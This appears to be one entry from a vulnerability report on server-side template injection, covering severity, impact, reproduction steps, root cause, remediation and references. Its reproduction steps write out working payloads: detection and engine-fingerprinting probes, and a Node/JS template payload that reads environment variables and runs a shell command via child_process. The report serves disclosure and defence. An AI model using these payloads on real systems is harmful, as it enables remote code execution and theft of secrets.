# 07 — SSTI: Server-Side Template Injection

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **CVSS 3.1** | 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **Category** | Injection (OWASP A03:2021) |
| **Endpoint** | Server-side template rendering |

## Summary

A user-controlled value is embedded directly into a server-side template that is then evaluated by the template engine. Because the input is treated as template code rather than data, an attacker can inject template expressions that the server executes — leading to information disclosure and, in many engines, full **remote code execution**.

## Impact

- Arbitrary expression evaluation on the server.
- Potential remote code execution and full host compromise.
- Disclosure of environment variables, secrets and internal data.

## Steps to reproduce

1. Identify an input whose value is later reflected into server-rendered output (e.g. a product name, a profile field, or a query parameter used in a template).
2. Submit a mathematical probe to detect evaluation:

   ```
   {{7*7}}
   ```

   If the response shows `49` instead of the literal `{{7*7}}`, the input is evaluated server-side.

3. Fingerprint the engine with engine-specific probes:

   ```
   ${7*7}        # Java / EL
   #{7*7}        # Ruby / others
   {{7*'7'}}     # Jinja2 -> 7777777, Twig -> 49
   ```

4. Escalate to command execution (example for a Node/JS-based engine):

   ```
   {{ this.constructor.constructor('return process.env')() }}
   ```

   or, to run a command:

   ```
   {{ this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')() }}
   ```

5. Observe the command output reflected in the response.

## Root cause

User input is concatenated into the template string before rendering, instead of being passed as **bound data** to a precompiled template. The engine therefore parses attacker input as code.

## Remediation

- **Never build templates from user input.** Pass user data as context variables to a static, precompiled template.
- Use logic-less templates where possible.
- Run rendering in a sandboxed context with no access to dangerous globals.
- Apply strict input validation and contextual output encoding.

## References

- [PortSwigger — Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [OWASP — Testing for SSTI](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)
